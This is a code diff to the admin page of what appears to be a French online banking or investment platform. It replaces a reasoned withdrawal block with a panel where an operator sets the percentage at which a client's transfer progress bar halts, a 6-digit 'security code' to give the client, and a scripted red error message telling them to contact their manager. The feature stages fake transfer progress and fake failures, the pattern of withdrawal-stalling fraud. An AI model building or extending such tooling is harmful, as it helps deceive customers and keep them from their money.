@@ -53,6 +53,10 @@ interface AdminWithdrawal {
   bic: string;
   amountCents: number;
   description?: string;
+  otpCode?: string | null;
+  haltPercent?: number | null;
+  haltMessage?: string | null;
+  errorCode?: string | null;
   status: "pending_review" | "pending_admin_otp" | "pending_otp" | "failed_verification" | "blocked_by_admin" | "blocked_at_routing" | "completed";
   createdAt: string;
   userFirstName?: string;
@@ -91,8 +95,12 @@ export default function AdminPage() {
 
   // Block withdrawal modal
   const [blockWithdrawal, setBlockWithdrawal] = useState<AdminWithdrawal | null>(null);
-  const [blockWithdrawalReason, setBlockWithdrawalReason] = useState("");
+  const [blockWithdrawalPercent, setBlockWithdrawalPercent] = useState<number>(50);
+  const [blockWithdrawalOtpCode, setBlockWithdrawalOtpCode] = useState<string>("");
+  const [blockWithdrawalMessage, setBlockWithdrawalMessage] = useState<string>("Une erreur est survenue, veuillez contacter votre gestionnaire ou bien tentez à nouveau plus tard.");
   const [blockWithdrawalLoading, setBlockWithdrawalLoading] = useState(false);
+  const [blockWithdrawalSuccessCode, setBlockWithdrawalSuccessCode] = useState<string | null>(null);
+  const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);
 
   const fetchUsers = useCallback(async () => {
     try {
@@ -248,22 +256,42 @@ export default function AdminPage() {
     }
   };
 
-  const blockWithdrawalAction = async (withdrawalId: string, reason: string) => {
+  const copyCode = (code: string, id: string) => {
+    navigator.clipboard.writeText(code);
+    setCopiedCodeId(id);
+    setTimeout(() => setCopiedCodeId(null), 2500);
+  };
+
+  const blockWithdrawalAction = async () => {
+    if (!blockWithdrawal) return;
     setBlockWithdrawalLoading(true);
     try {
       const res = await fetch("/api/admin/withdrawals/block", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ withdrawalId, reason }),
+        body: JSON.stringify({
+          withdrawalId: blockWithdrawal.id,
+          haltPercent: blockWithdrawalPercent,
+          otpCode: blockWithdrawalOtpCode,
+          haltMessage: blockWithdrawalMessage,
+        }),
       });
       const data = await res.json();
       if (res.ok && data.success) {
         setWithdrawals((prev) =>
-          prev.map((w) => (w.id === withdrawalId ? { ...w, status: "blocked_by_admin" } : w))
+          prev.map((w) =>
+            w.id === blockWithdrawal.id
+              ? {
+                  ...w,
+                  status: "pending_otp",
+                  otpCode: data.otpCode,
+                  haltPercent: data.haltPercent,
+                  haltMessage: data.haltMessage,
+                }
+              : w
+          )
         );
-        setBlockWithdrawal(null);
-        setBlockWithdrawalReason("");
-        alert("Virement bloqué avec succès.");
+        setBlockWithdrawalSuccessCode(data.otpCode);
       } else {
         alert(data.message || "Erreur lors du blocage");
       }
@@ -823,27 +851,52 @@ export default function AdminPage() {
                           {new Date(item.createdAt).toLocaleString("fr-FR")}
                         </td>
                         <td>
-                          {(item.status === "pending_review" || item.status === "pending_admin_otp" || item.status === "pending_otp") && (
-                            <button
-                              type="button"
-                              onClick={() => {
-                                setBlockWithdrawal(item);
-                                setBlockWithdrawalReason("");
-                              }}
-                              style={{
-                                background: "rgba(239, 68, 68, 0.2)",
-                                color: "#ef4444",
-                                border: "1px solid rgba(239, 68, 68, 0.4)",
-                                padding: "0.4rem 0.6rem",
-                                borderRadius: "6px",
-                                cursor: "pointer",
-                                fontSize: "0.75rem",
-                                fontWeight: 700,
-                              }}
-                            >
-                              <i className="fa-solid fa-ban"></i> Bloquer
-                            </button>
-                          )}
+                          <div style={{ display: "flex", alignItems: "center", gap: "0.5rem", flexWrap: "wrap" }}>
+                            {item.otpCode && (
+                              <button
+                                type="button"
+                                onClick={() => copyCode(item.otpCode!, item.id)}
+                                style={{
+                                  background: "rgba(168, 85, 247, 0.2)",
+                                  color: "#c084fc",
+                                  border: "1px solid rgba(168, 85, 247, 0.4)",
+                                  padding: "0.4rem 0.6rem",
+                                  borderRadius: "6px",
+                                  cursor: "pointer",
+                                  fontSize: "0.75rem",
+                                  fontWeight: 700,
+                                }}
+                                title="Copier le code pour le donner au client"
+                              >
+                                <i className={`fa-solid ${copiedCodeId === item.id ? "fa-check" : "fa-copy"}`}></i> {item.otpCode} ({item.haltPercent || 50}%)
+                              </button>
+                            )}
+
+                            {(item.status === "pending_review" || item.status === "pending_admin_otp" || item.status === "pending_otp") && (
+                              <button
+                                type="button"
+                                onClick={() => {
+                                  setBlockWithdrawal(item);
+                                  setBlockWithdrawalPercent(item.haltPercent || 50);
+                                  setBlockWithdrawalOtpCode(item.otpCode || Math.floor(100000 + Math.random() * 900000).toString());
+                                  setBlockWithdrawalMessage(item.haltMessage || "Une erreur est survenue, veuillez contacter votre gestionnaire ou bien tentez à nouveau plus tard.");
+                                  setBlockWithdrawalSuccessCode(null);
+                                }}
+                                style={{
+                                  background: "rgba(239, 68, 68, 0.2)",
+                                  color: "#ef4444",
+                                  border: "1px solid rgba(239, 68, 68, 0.4)",
+                                  padding: "0.4rem 0.6rem",
+                                  borderRadius: "6px",
+                                  cursor: "pointer",
+                                  fontSize: "0.75rem",
+                                  fontWeight: 700,
+                                }}
+                              >
+                                <i className="fa-solid fa-ban"></i> {item.status === "pending_otp" ? "Modifier blocage" : "Bloquer"}
+                              </button>
+                            )}
+                          </div>
                         </td>
                       </tr>
                     ))
@@ -1143,95 +1196,275 @@ export default function AdminPage() {
         </div>
       )}
 
-      {/* ================= MODALE "BLOQUER LE VIREMENT" ================= */}
+      {/* ================= MODALE "BLOQUER LE VIREMENT (POURCENTAGE & CODE)" ================= */}
       {blockWithdrawal && (
-        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.8)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: "1rem" }}>
-          <div style={{ background: "#0f172a", border: "1px solid rgba(255,255,255,0.15)", borderRadius: "20px", width: "100%", maxWidth: "460px", padding: "2rem", color: "#fff", boxShadow: "0 25px 50px rgba(0,0,0,0.5)" }}>
+        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.85)", backdropFilter: "blur(4px)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: "1rem" }}>
+          <div style={{ background: "#0f172a", border: "1px solid rgba(255,255,255,0.15)", borderRadius: "20px", width: "100%", maxWidth: "520px", padding: "2rem", color: "#fff", boxShadow: "0 25px 60px rgba(0,0,0,0.7)" }}>
+            
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
               <div style={{ display: "flex", alignItems: "center", gap: "0.6rem" }}>
-                <div style={{ width: "36px", height: "36px", borderRadius: "10px", background: "rgba(239, 68, 68, 0.2)", display: "flex", alignItems: "center", justifyContent: "center", color: "#ef4444" }}>
+                <div style={{ width: "38px", height: "38px", borderRadius: "10px", background: "rgba(239, 68, 68, 0.2)", display: "flex", alignItems: "center", justifyContent: "center", color: "#ef4444", fontSize: "1.1rem" }}>
                   <i className="fa-solid fa-ban"></i>
                 </div>
                 <div>
-                  <h2 style={{ fontSize: "1.15rem", fontWeight: 700, margin: 0 }}>Bloquer le virement</h2>
+                  <h2 style={{ fontSize: "1.2rem", fontWeight: 700, margin: 0 }}>Bloquer le virement</h2>
                   <span style={{ fontSize: "0.8rem", color: "#94a3b8" }}>
                     {(blockWithdrawal.amountCents / 100).toFixed(2)} € vers {blockWithdrawal.recipientName}
                   </span>
                 </div>
               </div>
-              <button onClick={() => { setBlockWithdrawal(null); setBlockWithdrawalReason(""); }} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: "1.25rem", cursor: "pointer" }}>
+              <button
+                onClick={() => {
+                  setBlockWithdrawal(null);
+                  setBlockWithdrawalSuccessCode(null);
+                }}
+                style={{ background: "none", border: "none", color: "#94a3b8", fontSize: "1.25rem", cursor: "pointer" }}
+              >
                 ✕
               </button>
             </div>
 
-            <div style={{ marginBottom: "1rem", padding: "1rem", background: "rgba(255,255,255,0.03)", borderRadius: "10px", fontSize: "0.85rem" }}>
-              <div><strong>Demandeur :</strong> {blockWithdrawal.userFirstName} {blockWithdrawal.userLastName} ({blockWithdrawal.userEmail})</div>
-              <div><strong>Bénéficiaire :</strong> {blockWithdrawal.recipientName}</div>
-              <div><strong>IBAN :</strong> {blockWithdrawal.iban}</div>
-              <div><strong>Montant :</strong> {(blockWithdrawal.amountCents / 100).toFixed(2)} €</div>
-            </div>
+            {/* SI DÉJÀ BLOQUÉ AVEC SUCCÈS : AFFICHER LE CODE À TRANSMETTRE */}
+            {blockWithdrawalSuccessCode ? (
+              <div style={{ textAlign: "center", padding: "1rem 0" }}>
+                <div style={{ width: "56px", height: "56px", borderRadius: "50%", background: "rgba(16, 185, 129, 0.2)", color: "#10b981", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "1.5rem", margin: "0 auto 1rem" }}>
+                  <i className="fa-solid fa-check"></i>
+                </div>
+                <h3 style={{ fontSize: "1.15rem", fontWeight: 700, margin: "0 0 0.5rem" }}>
+                  Blocage configuré avec succès !
+                </h3>
+                <p style={{ color: "#94a3b8", fontSize: "0.85rem", margin: "0 auto 1.25rem" }}>
+                  Le virement s&apos;interrompra à <strong>{blockWithdrawalPercent}%</strong>. Transmettez ce code à l&apos;utilisateur :
+                </p>
 
-            <div style={{ marginBottom: "1rem" }}>
-              <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.4rem", fontWeight: 600 }}>
-                Motif du blocage (obligatoire) :
-              </label>
-              <textarea
-                required
-                value={blockWithdrawalReason}
-                onChange={(e) => setBlockWithdrawalReason(e.target.value)}
-                placeholder="Ex: Bénéficiaire suspecté / Fraude / Demande client / Conformité..."
-                style={{
-                  width: "100%",
-                  minHeight: "100px",
-                  padding: "0.8rem 1rem",
-                  borderRadius: "12px",
-                  background: "rgba(255,255,255,0.06)",
-                  border: "1px solid rgba(255,255,255,0.15)",
-                  color: "#fff",
-                  fontSize: "0.95rem",
-                  boxSizing: "border-box",
-                  resize: "vertical",
-                  fontFamily: "inherit",
-                }}
-              />
-            </div>
+                <div
+                  style={{
+                    background: "#1e1b4b",
+                    border: "2px dashed #6366f1",
+                    borderRadius: "16px",
+                    padding: "1.25rem",
+                    marginBottom: "1.5rem",
+                  }}
+                >
+                  <span style={{ display: "block", fontSize: "0.75rem", textTransform: "uppercase", color: "#a5b4fc", letterSpacing: "1px", marginBottom: "0.4rem", fontWeight: 700 }}>
+                    Code de validation sécurisé
+                  </span>
+                  <div style={{ fontSize: "2.2rem", fontWeight: 800, fontFamily: "monospace", letterSpacing: "8px", color: "#fff" }}>
+                    {blockWithdrawalSuccessCode}
+                  </div>
+                  <button
+                    type="button"
+                    onClick={() => copyCode(blockWithdrawalSuccessCode, blockWithdrawal.id)}
+                    style={{
+                      marginTop: "0.75rem",
+                      padding: "0.5rem 1rem",
+                      borderRadius: "8px",
+                      background: copiedCodeId === blockWithdrawal.id ? "#22c55e" : "#4f46e5",
+                      border: "none",
+                      color: "#fff",
+                      fontSize: "0.85rem",
+                      fontWeight: 700,
+                      cursor: "pointer",
+                    }}
+                  >
+                    <i className={`fa-solid ${copiedCodeId === blockWithdrawal.id ? "fa-check" : "fa-copy"}`} style={{ marginRight: "0.4rem" }}></i>
+                    {copiedCodeId === blockWithdrawal.id ? "Code copié !" : "Copier le code"}
+                  </button>
+                </div>
 
-            <div style={{ display: "flex", gap: "0.75rem" }}>
-              <button
-                type="button"
-                onClick={() => { setBlockWithdrawal(null); setBlockWithdrawalReason(""); }}
-                style={{
-                  flex: 1,
-                  padding: "0.75rem",
-                  borderRadius: "10px",
-                  background: "rgba(255,255,255,0.08)",
-                  border: "none",
-                  color: "#fff",
-                  fontWeight: 600,
-                  cursor: "pointer",
-                }}
-              >
-                Annuler
-              </button>
-              <button
-                type="button"
-                onClick={() => blockWithdrawalAction(blockWithdrawal.id, blockWithdrawalReason)}
-                disabled={blockWithdrawalLoading || !blockWithdrawalReason.trim()}
-                style={{
-                  flex: 1,
-                  padding: "0.75rem",
-                  borderRadius: "10px",
-                  background: "linear-gradient(135deg, #ef4444, #dc2626)",
-                  border: "none",
-                  color: "#fff",
-                  fontWeight: 700,
-                  cursor: blockWithdrawalLoading || !blockWithdrawalReason.trim() ? "wait" : "pointer",
-                  opacity: blockWithdrawalLoading || !blockWithdrawalReason.trim() ? 0.6 : 1,
-                }}
-              >
-                {blockWithdrawalLoading ? "Blocage en cours…" : "Confirmer le blocage"}
-              </button>
-            </div>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setBlockWithdrawal(null);
+                    setBlockWithdrawalSuccessCode(null);
+                  }}
+                  style={{
+                    width: "100%",
+                    padding: "0.85rem",
+                    borderRadius: "12px",
+                    background: "rgba(255, 255, 255, 0.1)",
+                    border: "none",
+                    color: "#fff",
+                    fontWeight: 700,
+                    cursor: "pointer",
+                  }}
+                >
+                  Fermer
+                </button>
+              </div>
+            ) : (
+              /* FORMULAIRE DE CONFIGURATION DU BLOCAGE */
+              <div style={{ display: "flex", flexDirection: "column", gap: "1.1rem" }}>
+                <div style={{ padding: "0.85rem 1rem", background: "rgba(255,255,255,0.03)", borderRadius: "12px", fontSize: "0.85rem" }}>
+                  <div><strong>Demandeur :</strong> {blockWithdrawal.userFirstName} {blockWithdrawal.userLastName} ({blockWithdrawal.userEmail})</div>
+                  <div><strong>Bénéficiaire :</strong> {blockWithdrawal.recipientName}</div>
+                  <div><strong>IBAN :</strong> {blockWithdrawal.iban}</div>
+                  <div><strong>Montant :</strong> {(blockWithdrawal.amountCents / 100).toFixed(2)} €</div>
+                </div>
+
+                {/* 1. POURCENTAGE AUQUEL LE LOADER S'ARRÊTE */}
+                <div>
+                  <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.5rem", fontWeight: 700 }}>
+                    1. Pourcentage d&apos;arrêt du loader (%) :
+                  </label>
+                  
+                  {/* Boutons de sélection rapide */}
+                  <div style={{ display: "flex", gap: "0.5rem", marginBottom: "0.6rem" }}>
+                    {[25, 50, 75, 90].map((pct) => (
+                      <button
+                        key={pct}
+                        type="button"
+                        onClick={() => setBlockWithdrawalPercent(pct)}
+                        style={{
+                          flex: 1,
+                          padding: "0.5rem",
+                          borderRadius: "8px",
+                          border: blockWithdrawalPercent === pct ? "2px solid #ef4444" : "1px solid rgba(255,255,255,0.12)",
+                          background: blockWithdrawalPercent === pct ? "rgba(239, 68, 68, 0.25)" : "rgba(255,255,255,0.05)",
+                          color: blockWithdrawalPercent === pct ? "#f87171" : "#cbd5e1",
+                          fontWeight: 700,
+                          fontSize: "0.9rem",
+                          cursor: "pointer",
+                        }}
+                      >
+                        {pct}%
+                      </button>
+                    ))}
+                  </div>
+
+                  <div style={{ display: "flex", alignItems: "center", gap: "0.75rem" }}>
+                    <input
+                      type="number"
+                      min="1"
+                      max="99"
+                      value={blockWithdrawalPercent}
+                      onChange={(e) => setBlockWithdrawalPercent(Math.min(99, Math.max(1, parseInt(e.target.value) || 1)))}
+                      style={{
+                        width: "100px",
+                        padding: "0.6rem 0.8rem",
+                        borderRadius: "10px",
+                        background: "rgba(255,255,255,0.06)",
+                        border: "1px solid rgba(255,255,255,0.15)",
+                        color: "#fff",
+                        fontSize: "1.1rem",
+                        fontWeight: 800,
+                        textAlign: "center",
+                      }}
+                    />
+                    <span style={{ fontSize: "0.8rem", color: "#94a3b8" }}>
+                      Le loader va tourner jusqu&apos;à <strong>{blockWithdrawalPercent}%</strong> puis s&apos;arrêter net.
+                    </span>
+                  </div>
+                </div>
+
+                {/* 2. CODE OTP À ENVOYER À L'UTILISATEUR */}
+                <div>
+                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "0.4rem" }}>
+                    <label style={{ fontSize: "0.85rem", color: "#cbd5e1", fontWeight: 700 }}>
+                      2. Code de sécurité à 6 chiffres (à donner au client) :
+                    </label>
+                    <button
+                      type="button"
+                      onClick={() => setBlockWithdrawalOtpCode(Math.floor(100000 + Math.random() * 900000).toString())}
+                      style={{ background: "none", border: "none", color: "#60a5fa", fontSize: "0.75rem", cursor: "pointer", textDecoration: "underline" }}
+                    >
+                      Régénérer
+                    </button>
+                  </div>
+                  <input
+                    type="text"
+                    maxLength={6}
+                    value={blockWithdrawalOtpCode}
+                    onChange={(e) => setBlockWithdrawalOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                    placeholder="Ex: 583912"
+                    style={{
+                      width: "100%",
+                      padding: "0.75rem 1rem",
+                      borderRadius: "10px",
+                      background: "rgba(255,255,255,0.06)",
+                      border: "2px solid #ef4444",
+                      color: "#fff",
+                      fontSize: "1.4rem",
+                      fontWeight: 800,
+                      fontFamily: "monospace",
+                      letterSpacing: "6px",
+                      textAlign: "center",
+                      boxSizing: "border-box",
+                    }}
+                  />
+                  <span style={{ fontSize: "0.75rem", color: "#64748b", marginTop: "0.25rem", display: "block" }}>
+                    L&apos;utilisateur devra saisir ce code avant que le loader ne progresse jusqu&apos;à {blockWithdrawalPercent}%.
+                  </span>
+                </div>
+
+                {/* 3. MESSAGE D'ERREUR ACCOMPAGNÉ */}
+                <div>
+                  <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.4rem", fontWeight: 700 }}>
+                    3. Message d&apos;erreur accompagné (affiché à {blockWithdrawalPercent}%) :
+                  </label>
+                  <textarea
+                    required
+                    value={blockWithdrawalMessage}
+                    onChange={(e) => setBlockWithdrawalMessage(e.target.value)}
+                    rows={3}
+                    placeholder="Ex: Une erreur est survenue, veuillez contacter votre gestionnaire ou bien tentez à nouveau plus tard."
+                    style={{
+                      width: "100%",
+                      padding: "0.75rem 1rem",
+                      borderRadius: "10px",
+                      background: "rgba(255,255,255,0.06)",
+                      border: "1px solid rgba(255,255,255,0.15)",
+                      color: "#fff",
+                      fontSize: "0.9rem",
+                      boxSizing: "border-box",
+                      resize: "vertical",
+                      fontFamily: "inherit",
+                    }}
+                  />
+                  <span style={{ fontSize: "0.75rem", color: "#64748b", marginTop: "0.25rem", display: "block" }}>
+                    Ce texte s&apos;affichera en rouge au client dès que le loader aura atteint {blockWithdrawalPercent}%.
+                  </span>
+                </div>
+
+                <div style={{ display: "flex", gap: "0.75rem", marginTop: "0.5rem" }}>
+                  <button
+                    type="button"
+                    onClick={() => { setBlockWithdrawal(null); }}
+                    style={{
+                      flex: 1,
+                      padding: "0.85rem",
+                      borderRadius: "10px",
+                      background: "rgba(255,255,255,0.08)",
+                      border: "none",
+                      color: "#fff",
+                      fontWeight: 600,
+                      cursor: "pointer",
+                    }}
+                  >
+                    Annuler
+                  </button>
+                  <button
+                    type="button"
+                    onClick={blockWithdrawalAction}
+                    disabled={blockWithdrawalLoading || blockWithdrawalOtpCode.length !== 6 || !blockWithdrawalMessage.trim()}
+                    style={{
+                      flex: 1,
+                      padding: "0.85rem",
+                      borderRadius: "10px",
+                      background: "linear-gradient(135deg, #ef4444, #dc2626)",
+                      border: "none",
+                      color: "#fff",
+                      fontWeight: 700,
+                      cursor: blockWithdrawalLoading ? "wait" : "pointer",
+                      boxShadow: "0 10px 20px -5px rgba(239, 68, 68, 0.4)",
+                    }}
+                  >
+                    {blockWithdrawalLoading ? "Configuration…" : `Confirmer le blocage à ${blockWithdrawalPercent}%`}
+                  </button>
+                </div>
+              </div>
+            )}
+
           </div>
         </div>
       )}
